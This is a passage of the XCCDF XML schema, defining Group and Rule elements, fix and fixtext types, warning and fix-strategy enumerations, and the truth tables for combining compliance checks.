            <xsd:annotation>
                <xsd:documentation xml:lang="en">If benchmark producers should prohibit changes to
                    this item during tailoring. An author should use this when they do not want to
                    allow end users to change the item. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute ref="xml:lang"/>
        <xsd:attribute ref="xml:base"/>
        <xsd:attribute name="Id" type="xsd:ID" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An identifier used for referencing elements
                    included in an XML signature</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>


    <!-- ************************************************************** -->
    <!-- ************ Selectable Item Type (Base Class)  ************** -->
    <!-- ************************************************************** -->
    <xsd:complexType name="selectableItemType" abstract="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> This abstract item type represents the basic data
                shared by all &lt;xccdf:Group&gt; and &lt;xccdf:Rule&gt; elements.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:itemType">
                <xsd:sequence>
                    <xsd:element name="rationale" type="cdf:htmlTextWithSubType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">Descriptive text giving rationale or
                                motivations for abiding by this
                                &lt;xccdf:Group&gt;/&lt;xccdf:Rule&gt; (i.e., why it is important to
                                the security of the target platform).</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="platform" type="cdf:overrideableCPE2idrefType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">Platforms to which this
                                &lt;xccdf:Group&gt;/&lt;xccdf:Rule&gt; applies.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="requires" type="cdf:idrefListType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">The identifiers of other
                                &lt;xccdf:Group&gt; or &lt;xccdf:Rule&gt; elements that must be
                                selected for this &lt;xccdf:Group&gt;/&lt;xccdf:Rule&gt; to be
                                evaluated and scored properly. Each &lt;xccdf:requires&gt; element
                                specifies a list of one or more required items by their identifiers.
                                If at least one of the specified &lt;xccdf:Group&gt; or
                                &lt;xccdf:Rule&gt; elements is selected, the requirement is met.
                            </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="conflicts" type="cdf:idrefType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">The identifier of another
                                &lt;xccdf:Group&gt; or &lt;xccdf:Rule&gt; that must be unselected
                                for this &lt;xccdf:Group&gt;/&lt;xccdf:Rule&gt; to be evaluated and
                                scored properly. Each &lt;xccdf:conflicts&gt; element specifies a
                                single conflicting item using its idref attribute. If the specified
                                &lt;xccdf:Group&gt; or &lt;xccdf:Rule&gt; element is not selected,
                                the requirement is met.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                </xsd:sequence>
                <xsd:attribute name="selected" type="xsd:boolean" default="true" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">If true, this
                            &lt;xccdf:Group&gt;/&lt;xccdf:Rule&gt; is selected to be processed as
                            part of the &lt;xccdf:Benchmark&gt; when it is applied to a target
                            system. An unselected &lt;xccdf:Group&gt; does not get processed, and
                            its contents are not processed either (i.e., all descendants of an
                            unselected &lt;xccdf:Group&gt; are implicitly unselected). An unselected
                            &lt;xccdf:Rule&gt; is not checked and does not contribute to scoring.
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="weight" type="cdf:weightType" default="1.0" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The relative scoring weight of this
                            &lt;xccdf:Group&gt;/&lt;xccdf:Rule&gt;, for computing a score, expressed
                            as a non-negative real number. It denotes the importance of an
                            &lt;xccdf:Group&gt;/&lt;xccdf:Rule&gt;. Under some scoring models,
                            scoring is computed independently for each collection of sibling
                            &lt;xccdf:Group&gt; and &lt;xccdf:Rule&gt; elements, then normalized as
                            part of the overall scoring process.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>

    <!-- ************************************************************** -->
    <!-- **********************  Group Element  *********************** -->
    <!-- ************************************************************** -->
    <xsd:element name="Group" type="cdf:groupType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">An item that can hold other items. It allows an author
                to collect related items into a common structure and provide descriptive text and
                references about them.</xsd:documentation>
        </xsd:annotation>
    </xsd:element>

    <xsd:complexType name="groupType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:Group&gt; element. A
                &lt;xccdf:Group&gt; element contains descriptive information about a portion of an
                &lt;xccdf:Benchmark&gt;, as well as &lt;xccdf:Rule&gt;, &lt;xccdf:Value&gt;, and/or
                other &lt;xccdf:Group&gt; elements</xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:selectableItemType">
                <xsd:sequence>
                    <xsd:element ref="cdf:Value" minOccurs="0" maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">&lt;xccdf:Value&gt; elements that
                                belong to this &lt;xccdf:Group&gt;. </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:choice minOccurs="0" maxOccurs="unbounded">
                        <xsd:element ref="cdf:Group">
                            <xsd:annotation>
                                <xsd:documentation xml:lang="en">Sub-&lt;xccdf:Groups&gt; under this
                                    &lt;xccdf:Group&gt;. </xsd:documentation>
                            </xsd:annotation>
                        </xsd:element>
                        <xsd:element ref="cdf:Rule">
                            <xsd:annotation>
                                <xsd:documentation xml:lang="en">&lt;xccdf:Rule&gt; elements that
                                    belong to this &lt;xccdf:Group&gt;. </xsd:documentation>
                            </xsd:annotation>
                        </xsd:element>
                    </xsd:choice>
                    <xsd:element name="signature" type="cdf:signatureType" minOccurs="0"
                        maxOccurs="1">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">A digital signature asserting
                                authorship and allowing verification of the integrity of the
                                &lt;xccdf:Group&gt;. </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                </xsd:sequence>
                <xsd:attribute name="id" type="cdf:groupIdType" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Unique element identifier; used by other
                            elements to refer to this element. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>


    <!-- ************************************************************** -->
    <!-- ********************  Rule Element  ************************** -->
    <!-- ************************************************************** -->
    <xsd:element name="Rule" type="cdf:ruleType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The &lt;xccdf:Rule&gt; element contains the
                description for a single item of guidance or constraint. &lt;xccdf:Rule&gt; elements
                form the basis for testing a target platform for compliance with an
                &lt;xccdf:Benchmark&gt;, for scoring, and for conveying descriptive prose,
                identifiers, references, and remediation information. </xsd:documentation>
        </xsd:annotation>
        <xsd:unique name="ruleCheckSelectorKey">
            <xsd:selector xpath="./cdf:check"/>
            <xsd:field xpath="@selector"/>
            <xsd:field xpath="@system"/>
        </xsd:unique>
        <xsd:unique name="ruleCheckIdKey">
            <xsd:selector xpath=".//cdf:check"/>
            <xsd:field xpath="@id"/>
        </xsd:unique>
    </xsd:element>

    <xsd:complexType name="ruleType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:Rule&gt; element that
                represents a specific &lt;xccdf:Benchmark&gt; test. </xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:selectableItemType">
                <xsd:sequence>
                    <xsd:element name="ident" type="cdf:identType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">A globally meaningful identifier for
                                this &lt;xccdf:Rule&gt;. This may be the name or identifier of a
                                security configuration issue or vulnerability that the
                                &lt;xccdf:Rule&gt; assesses.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="impact-metric" type="xsd:string" minOccurs="0" maxOccurs="1">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">The potential impact of failure to
                                conform to the &lt;xccdf:Rule&gt;, expressed as a CVSS 2.0 base
                                vector. </xsd:documentation>
                            <xsd:appinfo>
                                <deprecated_info>
                                    <version>1.2</version>
                                    <reason>The &lt;xccdf:impact-metric&gt; property was found to be
                                        of little use in the anticipated XCCDF use-cases.</reason>
                                    <comment>While there is no direct replacement for this property,
                                        authors seeking to include equivalent information can use an
                                        &lt;xccdf:Rule&gt; element's &lt;xccdf:metadata&gt; property
                                        to hold this information.</comment>
                                </deprecated_info>
                            </xsd:appinfo>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="profile-note" minOccurs="0" type="cdf:profileNoteType"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">Text that describes special aspects of
                                the &lt;xccdf:Rule&gt; related to one or more &lt;xccdf:Profile&gt;
                                elements. This allows an author to document things within
                                &lt;xccdf:Rule&gt; elements that are specific to a given
                                &lt;xccdf:Profile&gt;, and then select the appropriate text based on
                                the selected &lt;xccdf:Profile&gt; and display it to the
                                reader.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="fixtext" type="cdf:fixTextType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">Data that describes how to bring a
                                target system into compliance with this
                                &lt;xccdf:Rule&gt;.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="fix" type="cdf:fixType" minOccurs="0" maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">A command string, script, or other
                                system modification statement that, if executed on the target
                                system, can bring it into full, or at least better, compliance with
                                this &lt;xccdf:Rule&gt;.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:choice>
                        <xsd:element name="check" type="cdf:checkType" minOccurs="0"
                            maxOccurs="unbounded">
                            <xsd:annotation>
                                <xsd:documentation xml:lang="en">The definition of, or a reference
                                    to, the target system check needed to test compliance with this
                                    &lt;xccdf:Rule&gt;. Sibling &lt;xccdf:check&gt; elements must
                                    have different values for the combination of their @selector and
                                    @system attributes, and must have different values for their @id
                                    attribute (if any).</xsd:documentation>
                            </xsd:annotation>
                        </xsd:element>
                        <xsd:element name="complex-check" minOccurs="0" type="cdf:complexCheckType"
                            maxOccurs="1">
                            <xsd:annotation>
                                <xsd:documentation xml:lang="en">A boolean expression composed of
                                    operators (and, or, not) and individual
                                    checks.</xsd:documentation>
                            </xsd:annotation>
                        </xsd:element>
                    </xsd:choice>
                    <xsd:element name="signature" type="cdf:signatureType" minOccurs="0"
                        maxOccurs="1">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">A digital signature asserting
                                authorship and allowing verification of the integrity of the
                                &lt;xccdf:Rule&gt;.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                </xsd:sequence>
                <xsd:attribute name="id" type="cdf:ruleIdType" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Unique element identifier used by other
                            elements to refer to this element.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="role" type="cdf:roleEnumType" use="optional" default="full">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The &lt;xccdf:Rule&gt; element’s role in
                            scoring and reporting.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="severity" type="cdf:severityEnumType" default="unknown"
                    use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Severity level code to be used for metrics
                            and tracking.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="multiple" type="xsd:boolean" use="optional" default="false">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Applicable in cases where there are
                            multiple instances of a target. For example, an &lt;xccdf:Rule&gt; may
                            provide a recommendation about the configuration of application user
                            accounts, but an application may have many user accounts. Each account
                            would be considered an instance of the broader assessment target of user
                            accounts. If the @multiple attribute is set to true, each instance of
                            the target to which the &lt;xccdf:Rule&gt; can apply should be tested
                            separately and the results should be recorded separately. If @multiple
                            is set to false, the test results of such instances should be combined.
                            If the checking system does not combine these results automatically, the
                            results of each instance should be ANDed together to produce a single
                            result. If the benchmark consumer cannot perform multiple instantiation,
                            or if multiple instantiation of the &lt;xccdf:Rule&gt; is not applicable
                            for the target system, then the benchmark consumer may ignore this
                            attribute.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>


    <!-- ************************************************************** -->
    <!-- *****************  Rule-related Types ************************ -->
    <!-- ************************************************************** -->
    <xsd:complexType name="identType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:ident&gt; element, a
                globally meaningful identifier for an &lt;xccdf:Rule&gt;. The body of
                &lt;xccdf:ident&gt; element is the name or identifier of a security configuration
                issue or vulnerability that the &lt;xccdf:Rule&gt; addresses. It has an associated
                URI that denotes the organization or naming scheme that assigned the name. By
                setting an &lt;xccdf:ident&gt; element on an &lt;xccdf:Rule&gt;, the
                &lt;xccdf:Benchmark&gt; author effectively declares that the &lt;xccdf:Rule&gt;
                instantiates, implements, or remediates the issue for which the name was assigned.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="system" type="xsd:anyURI" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Denotes the organization or naming scheme
                            that assigned the identifier. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:anyAttribute namespace="##other" processContents="lax">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">May also have other attributes from other
                            namespaces in order to provide additional metadata for the given
                            identifier. </xsd:documentation>
                    </xsd:annotation>
                </xsd:anyAttribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="warningType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:warning&gt; element under
                the &lt;xccdf:Rule&gt; element. This element holds a note or caveat about the item
                intended to convey important cautionary information for the &lt;xccdf:Benchmark&gt;
                user. </xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:htmlTextWithSubType">
                <xsd:attribute name="category" type="cdf:warningCategoryEnumType" use="optional"
                    default="general">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A hint as to the nature of the
                            warning.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>

    <xsd:simpleType name="warningCategoryEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Allowed warning category keywords for the
                &lt;xccdf:warning&gt; element used in &lt;xccdf:Rule&gt; elements.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="general">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Broad or general-purpose warning
                        (default)</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="functionality">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Warning about possible impacts to functionality
                        or operational features</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="performance">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Warning about changes to target system
                        performance or throughput</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="hardware">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Warning about hardware restrictions or possible
                        impacts to hardware</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="legal">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Warning about legal
                        implications</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="regulatory">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Warning about regulatory obligations or
                        compliance implications</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="management">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Warning about impacts to the management or
                        administration of the target system</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="audit">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Warning about impacts to audit or
                        logging</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="dependency">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Warning about dependencies between this element
                        and other parts of the target system, or version
                        dependencies</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>


    <xsd:complexType name="fixTextType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:fixtext&gt; element, which
                contains data that describes how to bring a target system into compliance with an
                &lt;xccdf:Rule&gt;. Each &lt;xccdf:fixtext&gt; element may be associated with one or
                more &lt;xccdf:fix&gt; elements through the @fixref attribute. The body holds
                explanatory text about the fix procedures.</xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:htmlTextWithSubType">
                <xsd:attribute name="fixref" type="xsd:NCName" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A reference to the @id of an
                            &lt;xccdf:fix&gt; element. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="reboot" type="xsd:boolean" use="optional" default="0">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">True if a reboot is known to be required
                            and false otherwise. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="strategy" type="cdf:fixStrategyEnumType" use="optional"
                    default="unknown">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The method or approach for making the
                            described fix. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="disruption" type="cdf:ratingEnumType" use="optional"
                    default="unknown">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">An estimate of the potential for disruption
                            or operational degradation that the application of this fix will impose
                            on the target. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="complexity" type="cdf:ratingEnumType" use="optional"
                    default="unknown">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The estimated complexity or difficulty of
                            applying the fix to the target. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>

    <xsd:complexType name="fixType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:fix&gt; element. The body
                of this element contains a command string, script, or other system modification
                statement that, if executed on the target system, can bring it into full, or at
                least better, compliance with this &lt;xccdf:Rule&gt;. </xsd:documentation>
        </xsd:annotation>
        <xsd:choice minOccurs="0" maxOccurs="unbounded">
            <xsd:element name="sub" type="cdf:subType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Specifies an &lt;xccdf:Value&gt; or
                        &lt;xccdf:plain-text&gt; element to be used for text substitution
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="instance" type="cdf:instanceFixType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Designates a spot where the name of the
                        instance should be substituted into the fix template to generate the final
                        fix data. If the @context attribute is omitted, the value of the @context
                        defaults to “undefined”.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:choice>
        <xsd:attribute name="id" type="xsd:NCName" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">A local identifier for the element. It is optional
                    for the @id to be unique; multiple &lt;xccdf:fix&gt; elements may have the same
                    @id but different values for their other attributes. It is used primarily to
                    allow &lt;xccdf:fixtext&gt; elements to be associated with one or more
                    &lt;xccdf:fix&gt; elements </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="reboot" type="xsd:boolean" use="optional" default="0">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">True if a reboot is known to be required and false
                    otherwise. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="strategy" type="cdf:fixStrategyEnumType" use="optional"
            default="unknown">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The method or approach for making the described
                    fix. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="disruption" type="cdf:ratingEnumType" use="optional" default="unknown">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An estimate of the potential for disruption or
                    operational degradation that the application of this fix will impose on the
                    target. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="complexity" type="cdf:ratingEnumType" use="optional" default="unknown">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The estimated complexity or difficulty of applying
                    the fix to the target. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="system" type="xsd:anyURI" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">A URI that identifies the scheme, language, engine,
                    or process for which the fix contents are written. Table 17 in the XCCDF
                    specification defines several general-purpose URNs that may be used for this,
                    and tool vendors and system providers may define and use target-specific
                    URNs.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="platform" type="xsd:anyURI" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">In case different fix scripts or procedures are
                    required for different target platform types (e.g., different patches for
                    Windows Vista and Windows 7), this attribute allows a CPE name or CPE
                    applicability language expression to be associated with an &lt;xccdf:fix&gt;
                    element. This should appear on an &lt;xccdf:fix&gt; when the content applies to
                    only one platform out of several to which the &lt;xccdf:Rule&gt; could apply.
                </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:simpleType name="fixStrategyEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Allowed @strategy keyword values for an
                &lt;xccdf:Rule&gt; element's &lt;xccdf:fix&gt; or &lt;xccdf:fixtext&gt; elements.
                The values indicate the method or approach for fixing non-compliance with a
                particular &lt;xccdf:Rule&gt;. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="unknown">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Strategy not defined
                        (default)</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="configure">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Adjust target
                        configuration/settings</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="combination">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Combination of two or more
                        approaches</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="disable">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Turn off or uninstall a target component
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="enable">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Turn on or install a target
                        component</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="patch">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Apply a patch, hotfix, update,
                        etc.</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="policy">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Remediation requires out-of-band adjustments to
                        policies or procedures</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="restrict">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Adjust permissions, access rights, filters, or
                        other access restrictions</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="update">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Install, upgrade or update the
                        system</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="ratingEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> This type enumerates allowed rating values the
                disruption and complexity properties of an &lt;xccdf:Rule&gt; element's
                &lt;xccdf:fix&gt; or &lt;xccdf:fixtext&gt; elements. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="unknown">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Rating unknown or impossible to estimate
                        (default)</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="low">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Little or no potential for disruption, very
                        modest complexity</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="medium">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Some chance of minor disruption, substantial
                        complexity</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="high">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Likely to cause serious disruption, very
                        complex</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:complexType name="instanceFixType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for an &lt;xccdf:instance&gt; element which may
                appear in an &lt;xccdf:fix&gt; element. The &lt;xccdf:instance&gt; element inside an
                &lt;xccdf:fix&gt; element designates a spot where the name of the instance should be
                substituted into the fix template to generate the final fix data.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="context" type="xsd:string" default="undefined" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Describes the scope or significance of the instance
                    content. The context attribute is intended to be informative and does not affect
                    basic processing. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="complexCheckType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The type for an element that contains a boolean
                combination of &lt;xccdf:checks&gt;. This element can have only
                &lt;xccdf:complex-check&gt; and &lt;xccdf:check&gt; elements as children. Child
                elements may appear in any order but at least one child element must be present. It
                has two attributes, @operator and @negate, which dictate how &lt;xccdf:check&gt; or
                &lt;xccdf:complex-check&gt; child elements are to be combined. Truth tables for
                these operations appear below. </xsd:documentation>
            <xsd:appinfo>
                <evaluation_documentation>The two axes represent a pairwise combination of results.
                    Order of evaluation will not matter. Possible results are abbreviated as
                    follows: P = Pass, F = Fail, U = Unknown, E = Error, N = Not Applicable, K = Not
                    Checked, S = Not Selected, I = Informational. </evaluation_documentation>
                <evaluation_chart xml:space="preserve">
   AND             || P | F | U | E | N | K | S | I ||
-------------------||-------------------------------||
          Pass (P) || P | F | U | E | P | P | P | P ||
          Fail (F) || F | F | F | F | F | F | F | F ||
       Unknown (U) || U | F | U | U | U | U | U | U ||
         Error (E) || E | F | U | E | E | E | E | E || 
 Notapplicable (N) || P | F | U | E | N | N | N | N ||
    Notchecked (K) || P | F | U | E | N | K | K | K ||
   Notselected (S) || P | F | U | E | N | K | S | S || 
 Informational (I) || P | F | U | E | N | K | S | I ||
------------------------------------------------------ </evaluation_chart>
                <evaluation_chart xml:space="preserve">
    OR             || P | F | U | E | N | K | S | I ||
-------------------||-------------------------------||
          Pass (P) || P | P | P | P | P | P | P | P ||
          Fail (F) || P | F | U | E | F | F | F | F ||
       Unknown (U) || P | U | U | U | U | U | U | U ||
         Error (E) || P | E | U | E | E | E | E | E || 
 Notapplicable (N) || P | F | U | E | N | N | N | N ||
    Notchecked (K) || P | F | U | E | N | K | K | K ||
   Notselected (S) || P | F | U | E | N | K | S | S || 
 Informational (I) || P | F | U | E | N | K | S | I ||
------------------------------------------------------ </evaluation_chart>
                <evaluation_chart xml:space="preserve">
NOT || P | F | U | E | N | K | S | I ||
----||-------------------------------||
    || F | P | U | E | N | K | S | I ||
---------------------------------------</evaluation_chart>
            </xsd:appinfo>

        </xsd:annotation>
        <xsd:choice minOccurs="1" maxOccurs="unbounded">
            <xsd:element name="check" type="cdf:checkType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Instructions for a single
                        test.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="complex-check" type="cdf:complexCheckType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A child &lt;xccdf:complex-check&gt;, allowing
                        another level of logic in combining component checks.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:choice>
        <xsd:attribute name="operator" type="cdf:ccOperatorEnumType" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Indicates whether the child &lt;xccdf:check&gt;
                    and/or &lt;xccdf:complex-check&gt; elements of this &lt;xccdf:complex-check&gt;
                    should be combined using an AND or OR operation </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="negate" default="0" type="xsd:boolean" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">If true, negate the final result of this
                    &lt;xccdf:complex-check&gt; after the child elements are combined using the
                    identified operator.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:simpleType name="ccOperatorEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The type for the allowed @operator names for the
                &lt;xccdf:complex-check&gt; operator attribute. Only AND and OR operators are
                supported. (The &lt;xccdf:complex-check&gt; has a separate mechanism for negation.)
            </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="OR">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The logical OR of the component terms
                    </xsd:documentation>
